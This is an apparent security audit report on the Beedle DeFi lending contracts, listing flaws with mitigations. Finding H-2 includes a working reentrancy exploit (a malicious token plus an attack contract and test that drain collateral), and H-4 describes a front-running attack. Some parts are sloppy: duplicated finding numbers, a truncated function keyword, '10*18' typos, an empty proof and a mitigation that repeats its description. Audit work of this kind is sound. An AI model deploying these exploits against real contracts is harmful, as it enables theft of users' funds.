# High 

### [H-1]: `Beedle::Lender.sol` incorrectly calculates the `loanRatio` which can lead to losses

**Description:** Due to decimals mismatching an issue stems out which leads to incorrect calculation of `loanRatio`. This allows users to borrows more than intended due to decimal mismatch.

```solidity
    uint256 loanRatio = (debt * 10 ** 18) / collateral;
```

<b>Instances:</b>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232-L287>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355-L432>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591-L710>


**Impact:** Since, user can provide less collateral but he's able to borrow more tokens than the collateral it can lead to significant loss of funds.

**Recommended Mitigations:**

Make sure to scale debt and collateral based on the token decimals in order to calculate properly the `loanRatio`. This can be easily done by changing the loanRatio calculation as follows:

```solidity
  uint256 loanRatio = ((debt * (10**(18 - loanToken.decimals()))) * 10 ** 18) / (collateral * (10 ** (18 - collateralToken.decimals())));
```

### [H-2] `Beedle::Lender.sol` can be drained due to Rentrancy in `repay` function

**Description:** Since, its is not defined which token to use as loan/collateral, anyone can use any token as loan/Collateral. An attacker can create an `ERC-777` token allowing reentrant calls on transfer to drain any token from the `Lender` contract. The `Lender` contract allows any token as `loanToken` and the `repay` function transfers the tokens before deleting the loan which result in a re-entrancy vulnerability.

```solidity
	// transfer the loan tokens from the borrower to the pool
            IERC20(loan.loanToken).transferFrom( // @audit - Re-entrancy can drain contract
                msg.sender,
                address(this),
                loan.debt + lenderInterest
            );
            // transfer the protocol fee to the fee receiver
            IERC20(loan.loanToken).transferFrom(
                msg.sender,
                feeReceiver,
                protocolInterest
            );
            // transfer the collateral tokens from the contract to the borrower
            IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
                loan.debt,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );
            // delete the loan
@>            delete loans[loanId];
        }
```

**Impact:** User's can claim collateral more than once, which will lead to losses.

**Proof Of Code:**

File: ExploitToken.sol

```solidity
//SPDX-License-Indeitifer:MIT
pragma solidity ^0.8.16;

import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";


contract ExploitToken is ERC20{

address owner;
    constructor(uint256 amount)ERC20("ExploitToken","ET"){
            owner = msg.sender;
            _mint(msg.sender, amount);
    }

    // This function overrides _afterTokenTransfer, a virtual function in the OpenZeppelin ERC20 contract.
    // It executes after every token transfer (transfer, transferFrom, or _mint). This hook will execute on all toke transfers
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        (bool status,) = owner.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(status, "call failed");
    }
} 
```

File: Exploit7.sol

```solidity
//SPDX-License-Identifer: MIT
pragma solidity ^0.8.16;

import {ExploitToken} from "../src/ExploitToken.sol";
import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../src/utils/Structs.sol";
import "../src/Lender.sol";

contract Exploit7{  

    Lender lender;
    bool loanBorrowed;
    uint256 i;
    address collateralToken;
    ExploitToken exploitToken;

    constructor(Lender _lender, address _collateralToken){
        lender=_lender;
        collateralToken=_collateralToken;
    }

    function attack(address _collateralToken) external{
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        exploitToken = new ExploitToken(1_000_000_000*10*18);
        ERC20(exploitToken).approve(address(lender), type(uint256).max);

        Pool memory pool = Pool({
            lender: address(this),
            loanToken: address(exploitToken),
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 1_000_000*10*18,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1 days,
            interestRate: 0,
            outstandingLoans: 0
        });

        bytes32 poolId = lender.setPool(pool);

        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000*10**18
        });

        Borrow[] memory borrows = new Borrow[](1);

        borrows[0] = b;        

        lender.borrow(borrows);

        // (4) Take another loan of exploitTokens to increase poolBalance

        b = Borrow({
            poolId: poolId,
            debt: 1_000,
            collateral: 1
        });

        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        loanBorrowed = true;

        // (5) Repay the loan
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.repay(loanIds);
        // (7) Send the funds back to the attacker
        ERC20(_collateralToken).transfer(msg.sender, ERC20(_collateralToken).balanceOf(address(this)));   
    }

    function tokensReceived(address from, address to, uint256 /*amount*/) external {
        if (msg.sender == address(exploitToken)) {
            if (from == address(this) && to == address(lender) && loanBorrowed) {
                // (6) Re-enter the `repay` function (10 times for POC); 
                if (i < 10) {
                    i = i + 1;                    
                    uint256 loanId = 0;
                    uint256[] memory loanIds = new uint256[](1);
                    loanIds[0] = loanId;
                    lender.repay(loanIds);
                }          
            }
        }        
    }
}
```
File: Lender.t.sol

Add the below test to file:

```solidity
unction test_exploit7() public {
	address attacker = address(0x5);
	// Setup
	collateralToken.transfer(address(lender), 10_000*10**18);
	collateralToken.transfer(address(attacker), 1_000*10**18 + 1); 

	// Before the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 10_000*10**18);  // Lender contract has 10_000 collateralToken
	assertEq(collateralToken.balanceOf(address(attacker)), 1_000*10**18 + 1); // Attacker has 1_000 collateralToken

	// Exploit starts here
	vm.startPrank(attacker); // Attacker wants to drain all collateralTokens from the contract        
	Exploit7 attackContract = new Exploit7(lender, address(collateralToken));
	collateralToken.transfer(address(attackContract), 1_000*10**18 + 1);
	attackContract.attack(address(collateralToken));

	// After the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
	assertEq(collateralToken.balanceOf(address(attacker)), 11_000*10**18); // Attacker has stolen all the 10_000 collateralToken
}

```

**Recommended Mitigations:** Always follow the:> Checks - Effect - Interactions CEI) pattern

### [H-3] `Beedle::Fees.sol` lacks slippage protection

**Description:** The `Fees::sellProfits()` functions lacks slippage protection, the `amountOutMinimum` and `sqrtPriceLimitX96` are set to `0` when swapping in uniswap pools this makes the user vulnerable to price manipulation attacks, and user will end getting very less or no tokens. 

```solidity
function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
@>                amountOutMinimum: 0, 
@>                sqrtPriceLimitX96: 0 
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
}

```

**Impact:** When swapping tokens user can end up with very less or losing up all of the tokens.

**Recommended Mitigations:**
Specify `amountOutMinimum` with some value instead of zero and if necessary, specify the `sqrtPriceLimitX96` parameter to set a stop price.


### [H-4] Missing checks in `buyLoan` function 

**Description:** The `buyLoan` function is not having any check for `minLoanSize` and `maxLoanRatio`. The problem is when there is no `maxloanRatio` check,  malicious actors can take advantage of this by buying a loan after an auction is started for very less collateral and can borrow a huge loan.

**Proof Of Code**:

1. User create a pool with very high interest lets say maximum interest.
2. From another wallet, the same user takes a borrow for 1000 USDC and gives 3000 USDT as collateral
3. User A calls startAuction for this loan. User B sees the loan on auction and since it has high interest rate and is well-collateralized, decides to buy it. User B calls buyLoan and passes to corresponding loanId.
4. User sees the pending transaction and front-runs it and changes his pool.maxLoanRatio to type(uint256).max (basically allowing for loans not sufficiently backed up by collateral)
5. After changing the maxLoanRatio, user A calls refinance and sets the loan debt to user B's pool balance and changes the collateral to 1 USDT.
6. After doing so, user A changes maxLoanRatio back to its original value and once again calls startAuction with the same loanId.
7. Considering steps 6-8 all executed before user B's buyLoan, user B's call now executes and they've bought a borrow for all of their pool balance, backed up by pretty much no collateral.
8. User A successfully executed the attack and has now taken a huge borrow which they have no incentive to repay as there isn't any valuable collateral attached to it.
9. User A can then either withdraw their funds from their pool or repeat the attack. 

**Impact:** Users will end up losing there funds

**Recommended Mitigations:** 

Add the below check:

```solidity
+        uint256 loanRatio = (totalDebt * 10 ** 18) / loan.collateral;
+        if (loanRatio > pools[poolId].maxLoanRatio) revert RatioTooHigh();
```

### [H-4] Missing `msg.sender` check in `buyLoan` function 

**Description:** Due to insufficient checks in `buyLoan` function, it allows malicious actors to buy loan from auction by passing a `poolId` that they don't own (i.e is they are not the lender of the pool). As a result, the function incorrectly updates the loan's ownership to the malicious actor's address without requiring any collateral transfer.

The malicious actor identifies a loan in the auction and decides to purchase it. Using the `buyLoan` function, the malicious actor passes a `poolId` that they do not own and also may not Have the same loanTokens and collateralTokens ,since there are no checks for mismatching tokens which gives the malicious actor a lot of choice from pools. As a result, the function updates the loan ownership to the malicious actor's address while taking the debt from the pool provided by the malicious actor.

**Proof Of Code:**

********************************

**Impact:** Loan is permanently bricked and can never be repaid as attacker has become loan.lender.

**Recommended Mitigations:**

1. Lender.buyLoan() can validate that msg.sender is the pool's lender. This would stop anyone from matching an auctioned loan with a pool, so according to the system design this is not a great option,
2. Change [L518](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L518) to set loans\[loanId].lender to pools\[poolId].lender instead of msg.sender. This preserves the system design that anyone can match an auctioned loan with a pool so this is the better option.

### [H-5] Revert on `Beedle::Fees::sellProfits` function

**Description:** In the `Beedle::Fees::sellProfits` function token are not approved to be spent by the uniswap router. This will cause any call to `sellProfits` to always revert upon calling and will results in all tokens sent to the contract to be locked forever.

```solidity
	amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
```

**Impact:** This issue will make any ERC20 tokens sent to be contract to be permanently frozen in the contract.

**Recommended step:**

Add the below line to the code:

```solidity
    IERC20(_profits).approve(address(swapRouter), IERC20(_profits).balanceOf(address(this)))
    amount = swapRouter.exactInputSingle(params);
    IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
```

### [H-6] Borrows can prevent the loans from being liquidated 

**Description:** `Lender.buyLoan()` doesn't check if the poolId parameter is the same pool that has auctioned the loan. An attacker can use Lender.buyLoan() to grief the selling pool by stopping the auction via buying the auctioned loan back to the same pool. This also reduces that pool's balance and increases that pool's outstanding loans, negatively impacting the pool's financials.

**Impact:** Attacker can grief any auction stopping it at will by buying the auctioned loan back to the originating pool. This also decreases the pool's balance & increases the pool's outstanding loans, hurting the pool financially.

**Proof Of Code:**

Add these to functions to `Lender.sol`:

```solidity
// added for audit contest proof of concept
function getPoolBalance(bytes32 poolId) external view returns(uint256 poolBalance) {
	return pools[poolId].poolBalance;
}
// added for audit contest proof of concept
function getPoolOutstandingLoans(bytes32 poolId) external view returns(uint256 outstandingLoans) {
	return pools[poolId].outstandingLoans;
}
```

Then add the test to `test/Lender.t.sol`:

```solidity
function test_attackerGriefBuyLoanToSellingPool() public {
	// using modified setup from test_buyLoan()
	test_borrow();
	// accrue interest
	vm.warp(block.timestamp + 364 days + 12 hours);

	// find the poolId which will auction the loan
	bytes32 poolId = lender.getPoolId(lender1, address(loanToken), address(collateralToken));

	// record the pool's balance & outstanding loans before the auction & exploit
	uint256 poolBalanceBefore = lender.getPoolBalance(poolId);
	uint256 poolOustandingLoansBefore = lender.getPoolOutstandingLoans(poolId);

	// kick off auction
	vm.startPrank(lender1);

	uint256[] memory loanIds = new uint256[](1);
	loanIds[0] = 0;

	lender.startAuction(loanIds);

	// warp to middle of auction
	vm.warp(block.timestamp + 12 hours);

	// stop lender1 prank
	vm.stopPrank();

	// attacker is not a lender & has no pool but can
	// call Lender.buyLoan() to force selling pool to buy their own loan
	// this will grief the auction as the attacker can always stop an auction
	// by forcing the selling pool to buy back its own loan
	address attacker = address(0x1337);
	vm.prank(attacker);
	lender.buyLoan(loanIds[0], poolId);

	// record the pool's balance & outstanding loans after the exploit
	uint256 poolBalanceAfter = lender.getPoolBalance(poolId);
	uint256 poolOustandingLoansAfter = lender.getPoolOutstandingLoans(poolId);

	console.log("poolBalanceBefore         : ", poolBalanceBefore);
	console.log("poolBalanceAfter          : ", poolBalanceAfter);
	console.log("poolOustandingLoansBefore : ", poolOustandingLoansBefore);
	console.log("poolOustandingLoansAfter  : ", poolOustandingLoansAfter);

	// this attack negatively impacts the pool's balance & oustanding loans:
	// pool balance is reduced after the attack
	assert(poolBalanceAfter < poolBalanceBefore);
	// pool outstanding loan is increased after the attack 
	assert(poolOustandingLoansAfter > poolOustandingLoansBefore);
}
```

**Recommended Mitigations:**

Lender.buyLoan() must check poolId parameter does not match the selling poolId.

### [H-7] Allowing the borrower to maintain control of their collateral indefinitely without resolving the debt.

**Description:** The identified issue is that the borrower can grief an auction by repeatedly refinancing their `loan within the same pool`, resetting the loan's auction timeline and preventing their collateral from being seized.

The function allows refinnacing to the same pool, never checks that the loan being refinnaced currently is auctioned or not and resets `loan.auctionStartTimestamp` effectively cancelling any auction.

```solidity
loans[loanId].auctionStartTimestamp = type(uint256).max;
loans[loanId].auctionLength = pool.auctionLength;
```
By refinancing back into the same pool, these parameters are reset, effectively stopping any ongoing liquidation auction.

**Proof Of Code:**

```solidity
function test_borrowerGriefAuctionViaRefinance() public{
    test_borrow();

    // accrue interest
	vm.warp(block.timestamp + 364 days + 12 hours);

	// find the poolId which will auction the loan
	bytes32 poolId = lender.getPoolId(lender1, address(loanToken), address(collateralToken));

	// kick off auction
	vm.startPrank(lender1);

    uint256[] memory loanIds = new uint256[](1);
	loanIds[0] = 0;

	lender.startAuction(loanIds);
	vm.stopPrank();

	// attacker is the borrower who wants to prevent their
	// loan from being auctioned, can stop the auction by
	// refinancing back into the same pool. They can do this
	// as soon as the auction is launched to prevent their
	// collateral from ever being seized
	vm.startPrank(borrower);

    // prepare the payload
	Refinance memory r = Refinance({
		loanId: 0,
		poolId: poolId,
		debt: 100*10**18,
		collateral: 100*10**18
	});
	Refinance[] memory rs = new Refinance[](1);
	rs[0] = r;

	lender.refinance(rs);
    vm.stopPrank();
    // verify that a buyer can't buy the auctioned loan
	address buyer = address(0x1234);
	vm.prank(buyer);
	vm.expectRevert();
	// will revert AuctionNotStarted
	lender.buyLoan(loanIds[0], poolId);

}
```

**Impact:** A hostile borrower who never intends on repaying their loan can use this exploit to prevent their collateral from ever being seized, since the only way to seize collateral is to run an auction & have that auction finish without any buyers. This results in a lender never being able to collect payment or seize the collateral; the borrower can maintain the loan indefinitely by using this exploit to immediately stop any auction of their loan.

**Recommended Mitigations:** Implement checks to find out that loan that is being auctioned cannot be refinnaced at the same time.

### [H-8] Debt is substracted twice from the pool

**Description:** The `refinance` function allows borrowers to move there loan to another pool under new lending conditions. The issue arises because the new pool's poolBalance is reduced twice during the refinance() function.

In refinance() the debt to the new pool is transferred at line 636:

```solidity
	_updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
```

The debt is subtracted again at line 696:

```solidity
     	pools[poolId].poolBalance -= debt;
```

**Impact:** Pool balances are reduced twice by the transferred debt. The larger the loan the greater the loss of funds to the new pool.

**Recommended Mitigations:** 

Only implement the line:

```solidity
     	pools[poolId].poolBalance -= debt;
```

### [H-9] `Beedle::Lender.sol` doesn't account for `Rebasing`, `Inflationary`, `Deflationary` and `Fee on Transfer` tokens

**Description:** 

The current implementation of the `Lender` contract does not handle these kinds of tokens:

* Rebasing tokens
* Inflationary tokens
* Deflationary tokens
* Tokens with fee-on-transfer

The accounting variables on the `Loan` and `Pool` structs will store an incorrect value that could lead to reverts or further accounting errors.

**Impact:** Since, the above token behaviours are not taken into account when performing calculation it can result in accounting errors or reverts.

**Recommended Mitigations:**

The protocol should choose one of the following options:

1. Have a list of whitelisted collateral and lending tokens that can be used
2. Correctly account the real amount that has been deposited to the `Lender` contract or from the `Lender` contract after the transfer has happened

### [H-10] `Borrow` and `Refinance` can be front-runned by the `Lender` leading to setting of unfavourable pool conditions

**Description:**

If a user/borrower calls the `borrow` or `refinance` functions, the pool lender can front-run and change the pool's `auctionLength` to an unfavorable (for the borrower) and very small value (e.g., `1`) by using the `setPool` function. Subsequently, the lender of the pool can start the auction for the loan. Due to the short `auctionLength`, the auction will end early. This allows the lender (or basically anyone) to seize the collateral in the next block.

* The `borrow` function assigns the `pool.auctionLength` to the loan in [L259](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L259)
* The `refinance` function updates the loan's auction length to the `pool.auctionLength` in [L694](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L694)

Another, problem is that the borrower can be frontrunned by a malicious lender changing the pool interest or a legitimate lender can change his pool interests while the `refinance()` function is executing making the borrower to take non-agreed interest by chance. Please see the next scenario:

1. Borrower calls the `refinance()` function because he wants to transfer his debt to a pool which has a 0.01% interest rate.
2. Legitimate lender just change his pool interests to 0.3% using the [updateInterestRate()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L221) function. This function is executed before the `step1` because the lender pay more gas.
3. The `refinance()` transaction is now executed but the pool interest has increased, now the borrower [end up with a different pool interest](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L688) (`0.3%`).


**Impact:** This can lead huge losses for borrowers

**Recomended Mitigations:**

Add a validation in the `refinance()` function which helps the borrower to specify the interest he is allowed to pay:

Consider allowing the borrower to define a minimum auction length when borrowing or refinancing and validate if the pool fulfills this criterion. Additionally, consider adding a reasonable minimum value for the auction length (e.g., 1 hour or 1 day) to allow the borrower to act appropriately.

### [H-11] In `Beedle::Fees` contract router address is hardcoded which can lead to loss of funds

**Description:** This audit report provides an assessment of the contract containing the hardcoded router address for token swaps. The router address is set to "0xE592427A0AEce92De3Edee1F18E0157C05861564" and refers to a specific instance of ISwapRouter. The hardcoded router address can cause issues when deployed on networks where this address does not correspond to the appropriate Uniswap router. 

```solidity

    /// uniswap v3 router
    ISwapRouter public constant swapRouter =
        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
```

**Impact:** Tokens may become locked in the protocol indefinitely, preventing withdrawals and potentially leading to financial losses.

**Recommended Mitigations:**

Avoid using hardcoded values, instead use something like this:

```solidity
constructor(address _swapRouter) {
    require(_swapRouter != address(0), "Invalid router address");
    swapRouter = ISwapRouter(_swapRouter);
}
```

### [H-12] `giveLoan` increases the TotalDebt

**Description:** Loans charge simple interest based on the interestRate parameter in the pool. However when a loan is transferred via giveLoan(), the debt over which the interest is charged is increased.

```solidity
	uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
```

Then the original debt is overwritten by totalDebt:

```solidity
loans[loanId].debt = totalDebt;
```

That means that the interest in this point is calculated based on `debt+lenderInterest+protocolInterest` rather than the debt when the loan was initialized. This means that the debt is COMPOUNDED every time it is transferred via `giveLoan()` compared to the lower simpleInterest charged when the loan is never transferred.

**Impact:** This issue can lead to borrower paying very high amount to get collateral back 

**Recommended Mitigations:** That means that the interest in this point is calculated based on `debt+lenderInterest+protocolInterest` rather than the debt when the loan was initialized. This means that the debt is COMPOUNDED every time it is transferred via `giveLoan()` compared to the lower simpleInterest charged when the loan is never transferred.


# Medium 

### [M-1] Precision Loss due to `Division Before Multiplication`

**Description:** The `_calculateInterest` function results in a small precision loss because of  `Division Before Multiplication`.

The `_calculateInterest` calculates the intrest by using this line of code:

```solidity
	interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days; 
```

Next, it calculates the fees using the the interest variable:

```solidity
 fees = (lenderFee * interest) / 10000; 
```
Here, precision loss occurs as Division was happend first to calculate intrest and then its used in multiplication with lenderFee to calculate `fees`.

**Impact:** The computed `fees` (`protocolInterest`) returned by the `_calculateInterest()` can suffer from the rounding down issue, resulting in a small precision loss, especially when a loan token has small decimals (e.g., [GUSD (Gemini dollar)](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd) has *2 decimals*).


**Recommended Mitigations:** Improve the formula to eliminate precision loss.

### [M-2]: If `borrower` or `lender` gets blacklisted by the asset, the collateral or loan funds then be forever frozen in the pool

**Description:** Its impossible for `borrower` or `lender` to transfer there funds if for some reason they got blacklisted by the asset token. These funds will be permanently frozen as now there is no mechanics to move them to another address or specify the recipient for the transfer.

* If during the duration of a loan the borrower or lender got blacklisted by `collateral asset` contract, let's say it is USDC, there is no way to retrieve the collateral. These collateral funds will be permanently locked at the Pool contract balance.
* This happens in [repay function](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L329) (which affects the borrower) and [seizeLoan function](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L565) (which affects the lender). There is no option to specify the address receiving the collateral asset.
* For `loan asset's case` (which affects the lender) there is a withdrawal possibility of loan funds via Lender.sol's [removeFromPool()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L198C14-L198C28), but for the lender there is no way to transfer funds due to ownership or even specify transfer recipient, so the corresponding loan funds will be frozen with the pool if current lender is blacklisted.

**Impact:** Principal funds of borrower or lender can be permanently frozen in full, but blacklisting is a low probability event.

**Recommended Mitigations:** 

Consider adding the `recipient` argument to the `repay()`, `seizeLoan()` and `removeFromPool()` functions, so the balance beneficiary `msg.sender` can specify what address should receive the funds

### [M-3] No Deadline for Token Swapping in `Fees` contract

**Description:** The `deadline` parameter in the `sellProfits` function is set to `block.timestamp`, which means function will accept token swap at any block number (i.e., no expiration deadline).

```solidity
    function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
@>              deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```

**Impact:** Without an expiration deadline, a malicious miner/validator can hold a transaction until they favor it or they can make a profit. As a result, the `Fees` contract can lose a lot of funds from slippage.

**Recommended Mitigations:** Specify a proper deadline value.

### [M-4] Single Ownership Transfer Process

**Description:** The custom contract Ownable.sol is inherited by Lender.sol which gives ownable functionality. However, its implementation is not safe currently as the process is 1-step which is risky due to a possible human error and such an error is unrecoverable. For example, an incorrect address, for which the private key is not known, could be passed accidentally.

**Impact:** Critical functions using the onlyOwner modifier will be locked - `setLenderFee`, `setBorrowerFee` and `setFeeReceiver`

**Recommeded Mitigations:**

Implement the change of ownership in 2 steps:

1. Approve a new address as a pendingOwner
2. A transaction from the pendingOwner address claims the pending ownership change.

### [M-5] Fixes Fee in TokenSwapping in `Fees` contract

**Description:** UniswapV3 introduced multiple fee levels to cater to different types of pools and trading  behaviors. Not all pools in Uniswap v3 are created with the 0.3% fee rate. Additionally, even if a 0.3% fee pool exists for a pair,it might not necessarily be the most liquid or the optimal pool for the trade. Relying solely on a hardcoded fee level can lead to inefficiencies and potential failures in the swap operation.

For instance, the optimal route to swap USDC for WETH is using the 0.05% (500) swap fee pool, which has significantly more liquidity than the 0.3% (3000) swap fee pool and thus less slippage.

Additionally, if the desired pool is not available, the swap will fail, or an attacker could exploit this by creating an imbalanced  pool with the desired swap fee and stealing the tokens.

**Impact:** Using fixed fee level when swap tokens  may lead to some fee tokens being locked in contract.

**Recommended Mitigations:** 

```solidity
-   function sellProfits(address _profits) public {
+   function sellProfits(address _profits, uint24 fee) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));


        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
-               fee: 3000,
+               fee: fee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });


        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```

### [M-6] Non-Fixed Pragma usage can result in non-functional contract when deployed to Arbitrum

**Description:** Pragma has been set to ^0.8.19 allowing the contracts to be compiled with a compiler equal or greater than 0.8.19. The problem with compiling is that Arbitrum is NOT compatible with 0.8.20 and later.

Contracts compiled with non specified versions will result in a non-functional or potentially damaged version that won't behave as expected. The default behaviour of compiler would be to use the newest version which would mean by default it will be compiled with the 0.8.20 version which will produce broken code.

**Proof Of Code:** 

Instances:

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L2>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L2>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L2>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol#L2>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol#L2>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/ISwapRouter.sol#L2>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Errors.sol#L2>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L2>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Structs.sol#L2>

**Impact:** Non-functional contracts when deployed to Arbitrum.

**Recommended Mitigations:** Lock or Constrain pragma as follows: pragma solidity 0.8.19 or pragma solidity >=0.8.0 <=0.8.19


### [M-7] Some ERC-20 token reverts on `Zero Value Transfer`

**Description:**  Some tokens revert on zero-value transfers. Considering both `borrowerFee` and `lenderFee` could be changed to 0 and loan's could happen for short-enough time for interest to round down to 0, it is completely possible for fees' value to be 0. If token which reverts on zero-value transfer is used, the transaction will revert and users will be unable to `borrow`, `repay`, `giveLoan`, `buyLoan`, `seizeLoan`.

**Impact:** Users transactions will revert and they will be unable to call `borrow`, `repay`, `giveLoan`, `buyLoan`, `seizeLoan`.

**Recommended Mitigations:** Upon sending fees, make sure it is a non-zero value.

### [M-8] Lower Debt taken for Higher Time or vice-vera results in Intrest Free Loan

**Description:** Any case where `(l.interestRate * l.debt * timeElapsed)` is lower than `3.1536e11` will make it an interest-free loan. Loans accrue interest for every second since being taken out. The issue arises when loans are taken in low-decimal high-value tokens like WBTC. Such tokens' decimals allow the `interest` calculation to round down to 0 due to the `(l.interestRate * l.debt * timeElapsed)` calculation being lower than `3.1536e11`(10000 \* 365 days in seconds).

```solidity
    function _calculateInterest(Loan memory l) internal view returns (uint256 interest, uint256 fees) {
        uint256 timeElapsed = block.timestamp - l.startTimestamp;
 @>       interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days; //@audit if debt is very small negligble intrest or almost free
 @>       fees = (lenderFee * interest) / 10000; //@audit
        interest -= fees;
    }
```

For example: a loan with 1e6 worth of WTBC(around 300$) and a fee of 1000 basis points(10%) for 300 seconds will be interest-free. The same can be achieved with lower debt amounts for longer periods of time. For example, if the loan gets segmented into 10 smaller ones with 1e5 worth of debt in each the interest-free period will be more than 3000 seconds, and so on.

**Proof Of Code:**

Consider the [GUSD (Gemini dollar) token](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd), which has *2 decimals*.

* `l.debt`: 100 GUSD
* `l.interestRate`: 100 (1%) per year
* `timeElapsed`: 86400 seconds (1 day)
* `lenderFee`: 100 (1%)

```solidity
interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days
		 = (100 * (100 * 1e2) * 86400) / 10000 / 31536000
		 = 8640 / 31536
		 = 0 (rounding down; since Solidity has no fixed-point numbers)

fees = (lenderFee * interest) / 10000
     = (100 * 0) / 10000
     = 0
```

As you can see, the resulting `interest` and `fees` will become 0 due to the rounding down since Solidity has no fixed-point numbers. Consequently, a borrower does not need to pay the lender interest or protocol interest.

**Impact:** Loan can be borrowed without interest

**Recommended Mitigations:** Take decimal precision into account


### [M-9] Setting Borrower Fees to Zero can result into DOS of borrow functionality

**Decription:** If the protocol decides for whatever reason to set the protocol borrowing fee to 0 (example to encourage users to use the protocol), then a malicious actor can DoS all borrow operations by:

1. front-running any loan operation, fully borrowing all available pool tokens
2. normal user transaction would revert as there are no more tokens to borrow in the pool
3. malicious actor would also back-run the repaying of all his debt to the pool

By doing this, borrowing from any pool can be blocked. Also, the cost required to perform this attack is very low (no interest/fee to be paid, only gas cost required) and the attack results in the DoS of one of the most crucial feature of the protocol, i.e. borrow.

**Impact:** Users will not be able to perform borrow operations

**Recommended Mitigations:**

Modify the `_calculateInterest` to attribute a default protocol fee as to make this attack economically unsustainable.

The simplest alternative is to not allow the setting of borrower fees to 0. However this brings some limitations, as protocol may want to weaver any fees at one point but could not because of this situation.

# Low

### [L-1] Missing Zero Address Check

**Description:** There are many instances in the codebase that do not check for zero address. The `Lender::setFeeReceiver()` lacks checking the `address(0)`, leading to transaction reverts on the `borrow()`, `repay()`, `giveLoan()`, `buyLoan()`, `seizeLoan()`, and `refinance()`.

**Impact:** If the `address(0)` is inputted by mistake, the following functions will revert transactions.

* `borrow()` in [L267](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L267)
* `repay()` in [L325](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L325)
